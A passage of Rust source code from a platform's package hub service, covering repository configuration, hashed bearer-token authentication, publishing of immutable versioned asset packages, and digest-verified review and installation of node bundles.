            .list_platform_hub_repositories(&slug_segment(owner))
    }

    pub fn upsert_platform_repository(
        &self,
        owner: &str,
        repository_id: &str,
        title: &str,
        base_url: &str,
        remote_owner: &str,
        remote_project: &str,
        read_token: &str,
        visibility: &str,
        enabled: bool,
    ) -> Result<PlatformHubRepository, PlatformError> {
        let owner = slug_segment(owner);
        let repository_id = slug_segment(repository_id);
        if owner.is_empty() || repository_id.is_empty() || base_url.trim().is_empty() {
            return Err(PlatformError::new(
                "HUB_REPOSITORY_INVALID",
                "repository fields must not be empty",
            ));
        }
        validate_remote_hub_url(base_url.trim().trim_end_matches('/'))?;
        let uses_direct_base = is_direct_hub_base(base_url);
        if !uses_direct_base && (remote_owner.trim().is_empty() || remote_project.trim().is_empty())
        {
            return Err(PlatformError::new(
                "HUB_REPOSITORY_INVALID",
                "remote owner and project are required unless base_url already points to /api/projects/{owner}/{project}/hub",
            ));
        }
        let now = now_ts();
        let owner_user_id = self
            .control_data
            .get_user_auth(&owner)?
            .map(|user| user.profile.user_id)
            .ok_or_else(|| PlatformError::new("PLATFORM_USER_NOT_FOUND", "owner user not found"))?;
        let existing = self
            .control_data
            .list_platform_hub_repositories(&owner)?
            .into_iter()
            .find(|item| item.repository_id == repository_id);
        let row = PlatformHubRepository {
            source_id: existing
                .as_ref()
                .map(|item| item.source_id.clone())
                .filter(|value| !value.is_empty())
                .unwrap_or_else(|| format!("pmr_{}", random_hex(8))),
            owner_user_id: existing
                .as_ref()
                .map(|item| item.owner_user_id.clone())
                .filter(|value| !value.is_empty())
                .unwrap_or(owner_user_id),
            owner,
            repository_id,
            title: if title.trim().is_empty() {
                "Remote Hub".to_string()
            } else {
                title.trim().to_string()
            },
            base_url: base_url.trim().trim_end_matches('/').to_string(),
            remote_owner: if uses_direct_base {
                String::new()
            } else {
                slug_segment(remote_owner)
            },
            remote_project: if uses_direct_base {
                String::new()
            } else {
                slug_segment(remote_project)
            },
            read_token: preserve_or_replace_token(
                existing.as_ref().map(|item| item.read_token.as_str()),
                read_token,
            ),
            visibility: normalize_platform_source_visibility(visibility),
            enabled,
            created_at: existing.as_ref().map(|item| item.created_at).unwrap_or(now),
            updated_at: now,
        };
        self.control_data.put_platform_hub_repository(&row)?;
        Ok(row)
    }

    pub fn delete_platform_repository(
        &self,
        owner: &str,
        repository_id: &str,
    ) -> Result<(), PlatformError> {
        self.control_data
            .delete_platform_hub_repository(&slug_segment(owner), &slug_segment(repository_id))
    }

    pub fn ensure_default_platform_repository(&self, owner: &str) -> Result<(), PlatformError> {
        let owner = slug_segment(owner);
        if owner.is_empty() {
            return Ok(());
        }
        let existing = self.control_data.list_platform_hub_repositories(&owner)?;
        if existing
            .iter()
            .any(|item| item.repository_id == "zebflow-com")
        {
            return Ok(());
        }
        let now = now_ts();
        let owner_user_id = self
            .control_data
            .get_user_auth(&owner)?
            .map(|user| user.profile.user_id)
            .ok_or_else(|| PlatformError::new("PLATFORM_USER_NOT_FOUND", "owner user not found"))?;
        self.control_data
            .put_platform_hub_repository(&PlatformHubRepository {
                source_id: format!("pmr_{}", random_hex(8)),
                owner_user_id,
                owner,
                repository_id: "zebflow-com".to_string(),
                title: "Zebflow Hub".to_string(),
                base_url: default_hub_base_url(),
                remote_owner: String::new(),
                remote_project: String::new(),
                read_token: String::new(),
                visibility: "public".to_string(),
                enabled: true,
                created_at: now,
                updated_at: now,
            })?;
        Ok(())
    }

    pub fn upsert_repository(
        &self,
        owner: &str,
        project: &str,
        repository_id: &str,
        title: &str,
        base_url: &str,
        remote_owner: &str,
        remote_project: &str,
        read_token: &str,
        enabled: bool,
    ) -> Result<ProjectHubRepository, PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        let repository_id = slug_segment(repository_id);
        if owner.is_empty()
            || project.is_empty()
            || repository_id.is_empty()
            || base_url.trim().is_empty()
        {
            return Err(PlatformError::new(
                "HUB_REPOSITORY_INVALID",
                "repository fields must not be empty",
            ));
        }
        validate_remote_hub_url(base_url.trim().trim_end_matches('/'))?;
        let uses_direct_base = is_direct_hub_base(base_url);
        if !uses_direct_base && (remote_owner.trim().is_empty() || remote_project.trim().is_empty())
        {
            return Err(PlatformError::new(
                "HUB_REPOSITORY_INVALID",
                "remote owner and project are required unless base_url already points to /api/projects/{owner}/{project}/hub",
            ));
        }
        let now = now_ts();
        let existing = self
            .control_data
            .list_project_hub_repositories(&owner, &project)?
            .into_iter()
            .find(|item| item.repository_id == repository_id);
        let row = ProjectHubRepository {
            owner,
            project,
            repository_id,
            title: if title.trim().is_empty() {
                "Remote Hub".to_string()
            } else {
                title.trim().to_string()
            },
            base_url: base_url.trim().trim_end_matches('/').to_string(),
            remote_owner: if uses_direct_base {
                String::new()
            } else {
                slug_segment(remote_owner)
            },
            remote_project: if uses_direct_base {
                String::new()
            } else {
                slug_segment(remote_project)
            },
            read_token: preserve_or_replace_token(
                existing.as_ref().map(|item| item.read_token.as_str()),
                read_token,
            ),
            enabled,
            created_at: existing.as_ref().map(|item| item.created_at).unwrap_or(now),
            updated_at: now,
        };
        self.control_data.put_project_hub_repository(&row)?;
        Ok(row)
    }

    pub fn delete_repository(
        &self,
        owner: &str,
        project: &str,
        repository_id: &str,
    ) -> Result<(), PlatformError> {
        self.control_data.delete_project_hub_repository(
            &slug_segment(owner),
            &slug_segment(project),
            &slug_segment(repository_id),
        )
    }

    pub fn authenticate_token(
        &self,
        bearer_token: &str,
        required_scope: &str,
    ) -> Result<HubToken, PlatformError> {
        self.require_enabled()?;
        let token_value = bearer_token.trim();
        if token_value.is_empty() {
            return Err(PlatformError::new("HUB_TOKEN_INVALID", "token missing"));
        }
        let token_hash = sha256_hex(token_value.as_bytes());
        let matched = self
            .hub_data
            .list_all_hub_tokens()?
            .into_iter()
            .find(|token| token.secret_hash == token_hash);
        let Some(mut token) = matched else {
            return Err(PlatformError::new("HUB_TOKEN_INVALID", "token not found"));
        };
        if token.revoked_at.is_some() {
            return Err(PlatformError::new("HUB_TOKEN_REVOKED", "token revoked"));
        }
        if let Some(expires_at) = token.expires_at
            && expires_at > 0
            && expires_at <= now_ts()
        {
            return Err(PlatformError::new("HUB_TOKEN_EXPIRED", "token expired"));
        }
        if !token.grants_scope(required_scope) {
            return Err(PlatformError::new("HUB_TOKEN_FORBIDDEN", "scope missing"));
        }
        let Some(publisher) = self.hub_data.get_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &token.publisher_id,
        )?
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_MISSING",
                "publisher not found",
            ));
        };
        if !publisher.enabled {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_DISABLED",
                "publisher is disabled",
            ));
        }
        validate_publisher_scopes(&publisher, &[required_scope.to_string()])?;
        token.last_used_at = Some(now_ts());
        token.updated_at = now_ts();
        self.hub_data.put_hub_token(&token)?;
        Ok(token)
    }

    pub fn list_publish_sources(
        &self,
        owner: &str,
        project: &str,
        source_type: &str,
    ) -> Result<Vec<HubPublishSourceItem>, PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        let source_type = normalize_source_type(source_type);
        match source_type.as_str() {
            "pipeline_with_dependencies" => {
                let rows = self.projects.list_pipeline_meta_rows(&owner, &project)?;
                Ok(rows
                    .into_iter()
                    .map(|item| HubPublishSourceItem {
                        source_type: source_type.clone(),
                        source_ref: item.file_rel_path.clone(),
                        name: item.title.clone(),
                        description: if item.description.trim().is_empty() {
                            format!("Pipeline · {}", item.trigger_kind)
                        } else {
                            item.description.clone()
                        },
                        path: item.file_rel_path,
                    })
                    .collect())
            }
            "template_with_dependencies" => {
                let listing = self.projects.list_template_workspace(&owner, &project)?;
                Ok(listing
                    .items
                    .into_iter()
                    .filter(|item| item.kind != "folder")
                    .map(|item| HubPublishSourceItem {
                        source_type: source_type.clone(),
                        source_ref: item.rel_path.clone(),
                        name: item.name,
                        description: format!("Template · {}", item.file_kind),
                        path: item.rel_path,
                    })
                    .collect())
            }
            "folder_files" => {
                let layout = self.projects.project_layout(&owner, &project)?;
                let folders = list_repo_folders(&layout)?;
                Ok(folders
                    .into_iter()
                    .map(|path| HubPublishSourceItem {
                        source_type: source_type.clone(),
                        source_ref: path.clone(),
                        name: Path::new(&path)
                            .file_name()
                            .and_then(|v| v.to_str())
                            .unwrap_or(&path)
                            .to_string(),
                        description: "Folder files export".to_string(),
                        path,
                    })
                    .collect())
            }
            "project_files" => Ok(vec![HubPublishSourceItem {
                source_type,
                source_ref: ".".to_string(),
                name: format!("{project} project files"),
                description: "Entire repo workspace export".to_string(),
                path: "/".to_string(),
            }]),
            _ => Err(PlatformError::new(
                "HUB_SOURCE_INVALID",
                "unsupported source type",
            )),
        }
    }

    pub fn preview_publish_source(
        &self,
        owner: &str,
        project: &str,
        source_type: &str,
        source_ref: &str,
    ) -> Result<HubExportPreview, PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        let source_type = normalize_source_type(source_type);
        let layout = self.projects.project_layout(&owner, &project)?;
        match source_type.as_str() {
            "pipeline_with_dependencies" => {
                self.preview_pipeline(&owner, &project, &layout, source_ref)
            }
            "template_with_dependencies" => {
                self.preview_template(&owner, &project, &layout, source_ref)
            }
            "folder_files" => self.preview_folder(&layout, source_ref),
            "project_files" => self.preview_project(&layout),
            _ => Err(PlatformError::new(
                "HUB_SOURCE_INVALID",
                "unsupported source type",
            )),
        }
    }

    pub fn publish_asset(
        &self,
        authority_owner: &str,
        authority_project: &str,
        publisher_owner: &str,
        publisher_id: &str,
        publisher_display_name: &str,
        publisher_url: &str,
        publisher_email: &str,
        source_owner: &str,
        source_project: &str,
        source_type: &str,
        source_ref: &str,
        package_id: &str,
        version: &str,
        title: &str,
        description: &str,
        image_file_path: &str,
        visibility: &str,
        project_options: HubProjectBundlePublishOptions,
        tags: Vec<String>,
    ) -> Result<(HubAssetPackage, HubAssetVersion), PlatformError> {
        let _ = (authority_owner, authority_project);
        self.require_enabled()?;
        let authority_owner = HUB_SERVICE_SCOPE_OWNER.to_string();
        let authority_project = HUB_SERVICE_SCOPE_PROJECT.to_string();
        let publisher_owner = slug_segment(publisher_owner);
        let publisher_id = normalize_hub_id_segment(publisher_id, "publisher id")?;
        let source_owner = slug_segment(source_owner);
        let source_project = slug_segment(source_project);
        let source_type = normalize_source_type(source_type);
        let package_id = canonical_hub_package_id(&publisher_id, package_id)?;
        let version = version.trim();
        if authority_owner.is_empty()
            || authority_project.is_empty()
            || publisher_owner.is_empty()
            || publisher_id.is_empty()
            || source_owner.is_empty()
            || source_project.is_empty()
        {
            return Err(PlatformError::new(
                "HUB_PUBLISH_INVALID",
                "authority, publisher, and source must not be empty",
            ));
        }
        let Some(publisher) = self.hub_data.get_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &publisher_id,
        )?
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_MISSING",
                "publisher not found",
            ));
        };
        if !publisher.enabled {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_DISABLED",
                "publisher is disabled",
            ));
        }
        if !publisher.can_publish {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_FORBIDDEN",
                "publisher does not have publish permission",
            ));
        }
        let authority = self.ensure_service_authority()?;
        if package_id.is_empty() || version.is_empty() {
            return Err(PlatformError::new(
                "HUB_PUBLISH_INVALID",
                "package id and version must not be empty",
            ));
        }
        validate_hub_version(version)?;
        // Before the source is even read: a republish must not reach the
        // artifact file or the version row.
        self.enforce_release_immutability(&package_id, version)?;
        let mut preview =
            self.preview_publish_source(&source_owner, &source_project, &source_type, source_ref)?;
        if preview.entries.is_empty() {
            return Err(PlatformError::new(
                "HUB_PUBLISH_EMPTY",
                "nothing to publish for this source",
            ));
        }
        let project_initialization = self.apply_project_bundle_publish_options(
            &source_owner,
            &source_project,
            &source_type,
            &mut preview,
            project_options,
        )?;
        sanitize_hub_export_entries(&mut preview.entries)?;
        // A cover is presentation, so it never enters the release document: the
        // bytes go into the content-addressed artifact store and the package
        // row records the digest.
        let cover = match hub_cover_webp_from_path(
            &self
                .projects
                .project_layout(&source_owner, &source_project)?,
            image_file_path,
            &publisher,
        )? {
            Some((name, bytes)) => {
                let artifact_sha256 = self.store_artifact(&bytes)?;
                Some(HubAssetMedia {
                    name,
                    role: "cover".to_string(),
                    content_type: HUB_COVER_MEDIA_TYPE.to_string(),
                    size_bytes: bytes.len(),
                    artifact_sha256,
                })
            }
            None => None,
        };
        let active_pipelines = if preview.asset_kind == HUB_ASSET_KIND_PROJECT_BUNDLE {
            self.projects
                .list_active_pipeline_meta(&source_owner, &source_project)?
                .into_iter()
                .map(|meta| meta.file_rel_path)
                .collect()
        } else {
            Vec::new()
        };
        let image_url = cover
            .as_ref()
            .map(|item| format!("/api/hub/remote/assets/{package_id}/media/{}", item.name))
            .unwrap_or_default();
        let gallery = cover
            .as_ref()
            .map(|item| HubAssetGallery {
                cover: Some(crate::platform::model::HubAssetGalleryImage {
                    kind: "image".to_string(),
                    media_name: item.name.clone(),
                    alt: String::new(),
                }),
                items: Vec::new(),
            })
            .unwrap_or_default();
        let media = cover.into_iter().collect::<Vec<_>>();
        let artifact_rel = format!(
            "services/{}/packages/{}/versions/{}/artifact.json",
            DEFAULT_HUB_SERVICE_INSTANCE_ID, package_id, version
        );
        let artifact_abs = self.data_root.join(&artifact_rel);
        if let Some(parent) = artifact_abs.parent() {
            fs::create_dir_all(parent)?;
        }
        let now = now_ts();
        let resolved_publisher_display_name = if publisher_display_name.trim().is_empty() {
            publisher.display_name.clone()
        } else {
            publisher_display_name.trim().to_string()
        };
        let resolved_publisher_url = if publisher_url.trim().is_empty() {
            publisher.publisher_url.clone()
        } else {
            normalize_publisher_url(&publisher_id, publisher_url)
        };
        let resolved_publisher_email = if publisher_email.trim().is_empty() {
            publisher.email.clone()
        } else {
            publisher_email.trim().to_string()
        };
        // The release carries what installing it requires, plus the title and
        // one-line description that keep it self-describing offline.
        let manifest = HubPackageSpec {
            asset_kind: preview.asset_kind.clone(),
            title: if title.trim().is_empty() {
                preview.name.clone()
            } else {
                title.trim().to_string()
            },
            description: if description.trim().is_empty() {
                preview.description.clone()
            } else {
                description.trim().to_string()
            },
            active_pipelines,
            project_initialization,
            files: preview.entries.clone(),
        };
        let artifact_bytes = encode_hub_artifact(&package_id, &version, &manifest, "HUB_PUBLISH")?;
        let artifact_sha256 = sha256_hex(&artifact_bytes);
        let existing_package = self.hub_data.get_hub_asset_package(&package_id)?;
        self.enforce_publisher_package_quota(
            &publisher,
            &package_id,
            existing_package.as_ref(),
            artifact_bytes.len(),
        )?;
        atomic_write(&artifact_abs, &artifact_bytes)?;
        let package = HubAssetPackage {
            package_pk: existing_package
                .as_ref()
                .map(|item| item.package_pk.clone())
                .filter(|value| !value.is_empty())
                .unwrap_or_else(|| format!("mpkg_{}", random_hex(8))),
            authority_id: authority.authority_id.clone(),
            publisher_pk: publisher.publisher_pk.clone(),
            package_id: package_id.clone(),
            authority_owner: authority_owner.clone(),
            authority_project: authority_project.clone(),
            publisher_owner: publisher_owner.clone(),
            publisher_id: publisher_id.clone(),
            publisher_display_name: resolved_publisher_display_name,
            publisher_url: resolved_publisher_url,
            publisher_email: resolved_publisher_email,
            asset_kind: preview.asset_kind.clone(),
            title: manifest.title.clone(),
            description: manifest.description.clone(),
            summary: String::new(),
            description_md: String::new(),
            image_url,
            media,
            gallery,
            visibility: normalize_visibility(visibility),
            tags,
            created_at: existing_package.map(|item| item.created_at).unwrap_or(now),
            updated_at: now,
        };
        let version_row = HubAssetVersion {
            package_pk: package.package_pk.clone(),
            package_id: package_id.clone(),
            version: version.to_string(),
            authority_owner,
            authority_project,
            publisher_owner,
            publisher_id,
            source_owner,
            source_project,
            source_kind: source_type,
            source_ref: source_ref.to_string(),
            artifact_rel_path: artifact_rel,
            artifact_sha256,
            manifest: serde_json::to_value(&manifest)
                .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?,
            // A version row is written once and never again — the immutability
            // check above guarantees this row is new — so `now` is the moment
            // the release was created and stays that way for its whole life.
            created_at: now,
        };
        self.hub_data.put_hub_asset_package(&package)?;
        self.hub_data.put_hub_asset_version(&version_row)?;
        Ok((package, version_row))
    }

    pub fn review_publish_asset(
        &self,
        source_owner: &str,
        source_project: &str,
        publisher_id: &str,
        source_type: &str,
        source_ref: &str,
        package_id: &str,
        version: &str,
        title: &str,
        description: &str,
        image_file_path: &str,
        visibility: &str,
        project_options: HubProjectBundlePublishOptions,
        tags: Vec<String>,
    ) -> Result<HubPublishReview, PlatformError> {
        self.require_enabled()?;
        let source_owner = slug_segment(source_owner);
        let source_project = slug_segment(source_project);
        let publisher_id = normalize_hub_id_segment(publisher_id, "publisher id")?;
        let source_type = normalize_source_type(source_type);
        let package_id = canonical_hub_package_id(&publisher_id, package_id)?;
        let version = version.trim().to_string();
        validate_hub_version(&version)?;
        let Some(publisher) = self.hub_data.get_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &publisher_id,
        )?
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_MISSING",
                "publisher not found",
            ));
        };
        let mut preview =
            self.preview_publish_source(&source_owner, &source_project, &source_type, source_ref)?;
        let project_initialization = self.apply_project_bundle_publish_options(
            &source_owner,
            &source_project,
            &source_type,
            &mut preview,
            project_options,
        )?;
        sanitize_hub_export_entries(&mut preview.entries)?;
        let media = hub_cover_media_review(
            &self
                .projects
                .project_layout(&source_owner, &source_project)?,
            image_file_path,
            &publisher,
        )?;
        let title = if title.trim().is_empty() {
            preview.name.clone()
        } else {
            title.trim().to_string()
        };
        let description = if description.trim().is_empty() {
            preview.description.clone()
        } else {
            description.trim().to_string()
        };
        review_publish_artifact(
            package_id,
            version,
            preview,
            title,
            description,
            normalize_visibility(visibility),
            tags,
            media,
            project_initialization,
            // An export carries every entry inline today, so this channel is the
            // answer for a referenced one: only an artifact already in this
            // instance's store could be published and resolved by a receiver.
            &self.artifact_store(),
        )
    }

    fn apply_project_bundle_publish_options(
        &self,
        source_owner: &str,
        source_project: &str,
        source_type: &str,
        preview: &mut HubExportPreview,
        mut options: HubProjectBundlePublishOptions,
    ) -> Result<HubPackageInitialization, PlatformError> {
        if source_type != "project_files" || preview.asset_kind != HUB_ASSET_KIND_PROJECT_BUNDLE {
            return Ok(HubPackageInitialization::default());
        }

        options.include_libraries.sort();
        options.include_libraries.dedup();
        options.initial_data_paths = options
            .initial_data_paths
            .into_iter()
            .map(|path| normalize_repo_rel(&path))
            .filter(|path| initial_data_engine_for_path(path).is_some())
            .collect();
        options.initial_data_paths.sort();
        options.initial_data_paths.dedup();

        if !options.include_sekejap_schema {
            preview.entries.retain(|entry| {
                !normalize_repo_rel(&entry.rel_path).starts_with("schemas/sekejap/")
            });
        } else if !preview
            .entries
            .iter()
            .any(|entry| normalize_repo_rel(&entry.rel_path) == "schemas/sekejap/schema.json")
        {
            let export = sekejap::export_schema(&self.data_root, source_owner, source_project)?;
            if !export.tables.is_empty() {
                let content = String::from_utf8(sekejap::encode_schema_export(export)?)
                    .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?;
                preview.entries.push(text_export_entry(
                    "schemas/sekejap/schema.json",
                    "sekejap schema",
                    "Portable Sekejap schema",
                    content,
                ));
            }
        }

        preview
            .entries
            .retain(|entry| normalize_repo_rel(&entry.rel_path) != sqlite_schema::REPO_SCHEMA_PATH);
        if options.include_sqlite_schema {
            if let Some(sql) =
                sqlite_schema::export_schema_sql(&self.data_root, source_owner, source_project)?
            {
                preview.entries.push(text_export_entry(
                    sqlite_schema::REPO_SCHEMA_PATH,
                    "sqlite schema",
                    "Portable SQLite schema",
                    sql,
                ));
            }
        }

        let initial_data = if options.include_initial_data {
            preview
                .entries
                .iter()
                .filter_map(initial_data_step_from_entry)
                .filter(|step| {
                    options
                        .initial_data_paths
                        .iter()
                        .any(|path| path == &step.path)
                })
                .collect::<Vec<_>>()
        } else {
            Vec::new()
        };

        rewrite_project_libraries(preview, &options.include_libraries)?;
        let init = HubPackageInitialization {
            include_sekejap_schema: options.include_sekejap_schema,
            include_sqlite_schema: options.include_sqlite_schema,
            libraries: options.include_libraries,
            initial_data,
        };
        let init_content = serde_json::to_string_pretty(&init)
            .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?
            + "\n";
        preview
            .entries
            .retain(|entry| normalize_repo_rel(&entry.rel_path) != "zebflow.init.json");
        preview.entries.push(text_export_entry(
            "zebflow.init.json",
            "project initialization",
            "Project bundle initialization plan",
            init_content,
        ));
        Ok(init)
    }

    pub fn list_project_initial_data(
        &self,
        owner: &str,
        project: &str,
    ) -> Result<Vec<HubPackageInitialDataStep>, PlatformError> {
        let layout = self.projects.project_layout(owner, project)?;
        let mut steps = Vec::new();
        for (prefix, engine) in INITIAL_DATA_DIRS {
            let root = layout.repo_dir.join(prefix);
            if !root.is_dir() {
                continue;
            }
            collect_initial_data_steps(&layout.repo_dir, &root, engine, &mut steps)?;
        }
        steps.sort_by(|a, b| a.path.cmp(&b.path));
        steps.dedup_by(|a, b| a.path == b.path);
        Ok(steps)
    }

    pub fn install_asset(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
    ) -> Result<HubInstallResult, PlatformError> {
        let target_owner = slug_segment(target_owner);
        let target_project = slug_segment(target_project);
        self.require_enabled()?;
        let Some(version_row) = self.hub_data.get_hub_asset_version(package_id, version)? else {
            return Err(PlatformError::new(
                "HUB_ASSET_MISSING",
                "asset version not found",
            ));
        };
        let artifact_abs = self.data_root.join(&version_row.artifact_rel_path);
        let raw = fs::read(&artifact_abs)?;
        verify_hub_artifact_bytes(&raw, &version_row.artifact_sha256)?;
        let payload = parse_hub_artifact_bytes(&raw, "HUB_INSTALL")?;
        self.install_artifact_payload_from(
            target_owner,
            target_project,
            package_id,
            version,
            target_folder,
            &format!("local/{package_id}"),
            payload,
            &self.artifact_store(),
        )
    }

    /// This instance's Hub store, as an artifact channel.
    ///
    /// Artifacts sit at `<hub service root>/artifacts/<sha256>`, beside the
    /// package documents rather than under any one of them, so two packages
    /// naming one runtime share the single stored file.
    pub fn artifact_store(&self) -> HubArtifactChannel {
        HubArtifactChannel::local(self.hub_service_root())
    }

    fn hub_service_root(&self) -> PathBuf {
        self.data_root
            .join("services")
            .join(DEFAULT_HUB_SERVICE_INSTANCE_ID)
    }

    /// Puts one artifact into this instance's Hub store and returns its digest.
    ///
    /// The store is content-addressed, so publishing the same bytes twice is
    /// idempotent and costs one file. This is the writer half of the referenced
    /// form: a package that references an artifact is only installable from a
    /// Hub that holds it.
    pub fn store_artifact(&self, bytes: &[u8]) -> Result<String, PlatformError> {
        if bytes.len() > MAX_HUB_PACKAGE_REFERENCED_FILE_BYTES {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_TOO_LARGE",
                format!(
                    "artifact is {} bytes, over the {MAX_HUB_PACKAGE_REFERENCED_FILE_BYTES} \
                     byte limit for a referenced artifact",
                    bytes.len()
                ),
            ));
        }
        let sha256 = sha256_hex(bytes);
        let path = referenced_artifact_path(&self.hub_service_root(), &sha256)?;
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent)?;
        }
        atomic_write(&path, bytes)?;
        Ok(sha256)
    }

    pub fn review_asset_install(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
    ) -> Result<HubInstallReview, PlatformError> {
        let target_owner = slug_segment(target_owner);
        let target_project = slug_segment(target_project);
        self.require_enabled()?;
        let Some(version_row) = self.hub_data.get_hub_asset_version(package_id, version)? else {
            return Err(PlatformError::new(
                "HUB_ASSET_MISSING",
                "asset version not found",
            ));
        };
        let artifact_abs = self.data_root.join(&version_row.artifact_rel_path);
        let raw = fs::read(&artifact_abs)?;
        verify_hub_artifact_bytes(&raw, &version_row.artifact_sha256)?;
        let payload = parse_hub_artifact_bytes(&raw, "HUB_INSTALL_REVIEW")?;
        self.review_artifact_payload(
            &target_owner,
            &target_project,
            package_id,
            version,
            target_folder,
            &payload,
            &self.artifact_store(),
        )
    }

    /// Reviews a node bundle supplied directly, without publishing it first.
    ///
    /// A bundle authored locally or received as a file has no Hub entry, so
    /// there was previously no way in at all. It runs the identical review a
    /// published package runs: a Hub package is not safer, only published.
    pub fn review_local_node_bundle(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
        artifact: Value,
    ) -> Result<HubInstallReview, PlatformError> {
        let target_owner = slug_segment(target_owner);
        let target_project = slug_segment(target_project);
        let payload = parse_local_node_bundle_artifact(artifact, "NODE_BUNDLE_INSTALL_REVIEW")?;
        self.review_artifact_payload(
            &target_owner,
            &target_project,
            package_id,
            version,
            target_folder,
            &payload,
            &HubArtifactChannel::unresolvable(LOCAL_NODE_BUNDLE_BODY_HAS_NO_CHANNEL),
        )
    }

    /// Installs a node bundle supplied directly.
    ///
    /// Refuses on any policy violation before touching disk, regardless of what
    /// the caller approved: a violation is not a warning the user can accept.
    pub fn install_local_node_bundle(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
        artifact: Value,
    ) -> Result<HubInstallResult, PlatformError> {
        let payload = parse_local_node_bundle_artifact(artifact, "NODE_BUNDLE_INSTALL")?;
        self.install_node_bundle_payload(
            slug_segment(target_owner),
            slug_segment(target_project),
            package_id,
            version,
            target_folder,
            payload,
            &HubArtifactChannel::unresolvable(LOCAL_NODE_BUNDLE_BODY_HAS_NO_CHANNEL),
        )
    }

    /// Reviews a node bundle read from a file on disk.
    ///
    /// This is the local file channel: the document names its artifacts by
    /// digest, and they sit in `artifacts/<sha256>` beside it.
    pub fn review_local_node_bundle_document(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
        document_path: &Path,
    ) -> Result<HubInstallReview, PlatformError> {
        let payload = read_local_node_bundle_document(document_path, "NODE_BUNDLE_INSTALL_REVIEW")?;
        self.review_artifact_payload(
            &slug_segment(target_owner),
            &slug_segment(target_project),
            package_id,
            version,
            target_folder,
            &payload,
            &HubArtifactChannel::local(local_document_channel_base(document_path)),
        )
    }

    /// Installs a node bundle read from a file on disk, resolving every
    /// referenced artifact from `artifacts/<sha256>` beside the document.
    pub fn install_local_node_bundle_document(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
        document_path: &Path,
    ) -> Result<HubInstallResult, PlatformError> {
        let payload = read_local_node_bundle_document(document_path, "NODE_BUNDLE_INSTALL")?;
        self.install_node_bundle_payload(
            slug_segment(target_owner),
            slug_segment(target_project),
            package_id,
            version,
            target_folder,
            payload,
            &HubArtifactChannel::local(local_document_channel_base(document_path)),
        )
    }

    /// The shared body of every local node bundle install.
    ///
    /// The review runs first and a violation refuses the install, whatever the
    /// caller approved, and whichever channel supplied the document.
    #[allow(clippy::too_many_arguments)]
    fn install_node_bundle_payload(
        &self,
        target_owner: String,
        target_project: String,
        package_id: &str,
        version: &str,
        target_folder: &str,
        payload: HubPackageSpec,
        artifacts: &HubArtifactChannel,
    ) -> Result<HubInstallResult, PlatformError> {
        let review = self.review_artifact_payload(
            &target_owner,
            &target_project,
            package_id,
            version,
            target_folder,
            &payload,
            artifacts,
        )?;
        if !review.violations.is_empty() {
            return Err(PlatformError::new(
                "NODE_BUNDLE_INSTALL_REFUSED",
                format!(
                    "package cannot be installed: {}",
                    review.violations.join("; ")
                ),
            ));
        }

        self.install_artifact_payload_from(
            target_owner,
            target_project,
            package_id,
            version,
            target_folder,
            &format!("local/{package_id}"),
            payload,
            artifacts,
        )
    }

    /// Installs a package whose channel cannot resolve referenced artifacts.
    ///
    /// Every carried file installs exactly as before; a referenced one is
    /// refused, because a channel that supplies no location has nowhere to fetch
    /// from and an empty file is not an answer.
    fn install_artifact_payload(
        &self,
        target_owner: String,
        target_project: String,
        package_id: &str,
        version: &str,
        target_folder: &str,
        source_id: &str,
        payload: HubPackageSpec,
    ) -> Result<HubInstallResult, PlatformError> {
        self.install_artifact_payload_from(
            target_owner,
            target_project,
            package_id,
            version,
            target_folder,
            source_id,
            payload,
            &HubArtifactChannel::unresolvable(CHANNEL_WITHOUT_AN_ARTIFACT_LOCATION),
        )
    }

    /// Installs a package, resolving every referenced artifact through
    /// `artifacts` before a single byte is written.
    #[allow(clippy::too_many_arguments)]
    fn install_artifact_payload_from(
        &self,
        target_owner: String,
        target_project: String,
        package_id: &str,
        version: &str,
        target_folder: &str,
        source_id: &str,
        payload: HubPackageSpec,
        artifacts: &HubArtifactChannel,
    ) -> Result<HubInstallResult, PlatformError> {
        let layout = self
            .projects
            .project_layout(&target_owner, &target_project)?;
        let install_lock = self.install_lock(&layout.repo_dir);
        let _install_guard = install_lock
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let install_root =
            install_root_for_target_folder(package_id, &payload.asset_kind, target_folder);
        // A node bundle is a materialized artifact, so it installs under data/.
        // Everything else is project source and installs under repo/.
        let install_base = if payload.asset_kind == HUB_ASSET_KIND_NODE_BUNDLE {
            layout.data_dir.clone()
        } else {
            layout.repo_dir.clone()
        };
        // Every entry's bytes — carried and referenced alike — are produced and
        // verified here, before the first write. A digest mismatch or a missing
        // artifact returns now, with the project untouched.
        let prepared =
            prepare_hub_install_entries(&install_base, &install_root, &payload.files, artifacts)?;
        validate_prepared_pipeline_sources(&prepared)?;
        let previous_lock = if payload.asset_kind == HUB_ASSET_KIND_NODE_BUNDLE {
            Some(self.dependency_lock.read(&target_owner, &target_project)?)
        } else {
            None
        };

